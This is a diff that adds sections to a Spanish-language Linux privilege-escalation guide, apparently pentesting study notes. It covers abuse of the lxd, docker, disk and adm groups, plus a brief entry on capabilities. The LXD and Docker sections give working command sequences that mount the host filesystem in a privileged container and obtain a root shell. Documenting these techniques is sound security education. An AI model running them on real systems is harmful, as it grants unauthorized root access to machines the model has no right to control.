@@ -225,6 +225,93 @@ El archivo enumera todos los grupos del sistema. Luego podemos usar la herramien
 └──╼ getent group sudo                                                                             
 ```
 
+### LXC / LXD
+
+LXD es similar a Docker y actúa como el gestor de contenedores de Ubuntu. Al instalarse, todos los usuarios son agregados al grupo **lxd**. La pertenencia a este grupo puede ser utilizada para **escalar privilegios**, creando un contenedor LXD privilegiado y accediendo al sistema de archivos del host montado en `/mnt/root`.
+
+Primero, confirmamos la pertenencia al grupo:
+
+```
+devops@NIX02:~$ id
+uid=1009(user) gid=1009(user) groups=1009(user),110(lxd)
+```
+
+---
+
+#### Ejemplo con alpine
+
+```
+┌─[user@user]─[/]
+└──╼ unzip -q alpine.zip
+```
+
+```
+┌─[user@user]─[/]
+└──╼ cd 64-bit\ Alpine/
+```
+
+Se inicia el proceso de configuración de LXD utilizando las opciones por defecto:
+
+```
+┌─[user@user]─[/64-bit\ Alpine/]
+└──╼ lxd init
+```
+
+Importamos la imagen local.
+
+```
+┌─[user@user]─[/64-bit\ Alpine/]
+└──╼ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+```
+
+Creamos un contenedor con privilegios de root y montamos el sistema de archivos del host.
+
+```
+┌─[user@user]─[/64-bit\ Alpine/]
+└──╼ lxc init alpine r00t -c security.privileged=true
+
+┌─[user@user]─[/64-bit\ Alpine/]
+└──╼ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+```
+
+Finalmente obtenemos una shell como root.
+
+```
+┌─[user@user]─[/64-bit\ Alpine/]
+└──╼ lxc start r00t
+
+┌─[user@user]─[/64-bit\ Alpine/]
+└──╼ lxc exec r00t /bin/sh
+
+# id
+uid=0(root) gid=0(root)
+```
+
+### Docker
+
+Agregar un usuario al grupo **docker** es, en la práctica, equivalente a otorgar acceso root al sistema de archivos sin requerir contraseña. Los miembros del grupo pueden iniciar contenedores Docker con volúmenes montados desde el host.
+
+```bash
+┌─[user@user]─[/]
+└──╼ docker run -v /root:/mnt -it ubuntu
+```
+
+Esto monta el directorio `/root` del host dentro del contenedor.
+
+### Disk
+
+Los usuarios pertenecientes al grupo **disk** tienen acceso completo a los dispositivos ubicados en `/dev`, como `/dev/sda1`, que suele contener el sistema de archivos principal. Un atacante con estos privilegios puede utilizar herramientas como `debugfs` para acceder al sistema completo con privilegios de root, permitiendo la extracción de credenciales, claves SSH o la creación de usuarios.
+
+### Adm
+
+Los miembros del grupo **adm** pueden leer todos los logs almacenados en `/var/log`. Aunque esto no concede acceso root directo, puede ser explotado para obtener información sensible, analizar acciones de usuarios o enumerar tareas programadas (cron jobs).
+
+```bash
+┌─[user@user]─[/]
+└──╼ id
+uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
+```
+
 ### Detección de archivos ocultos
 
 Muchas carpetas y archivos se mantienen ocultos en un sistema Linux para que no sean obvios y se evita la edición accidental.
@@ -845,6 +932,10 @@ Contraseña: root
 └──╼ whoami
 root
 ```
+
+### Capabilities
+
+Las capabilities son una característica de seguridad en el sistema operativo Linux que permite otorgar privilegios específicos a los procesos, permitiéndoles realizar acciones específicas que de otro modo estarían restringidas. Algunas capacidades, como ```cap_sys_admin```, que permite que un ejecutable realice acciones con privilegios administrativos, puede ser peligroso si no se utilizan correctamente. 
 
 
 ### Contraseñas en la configuración web
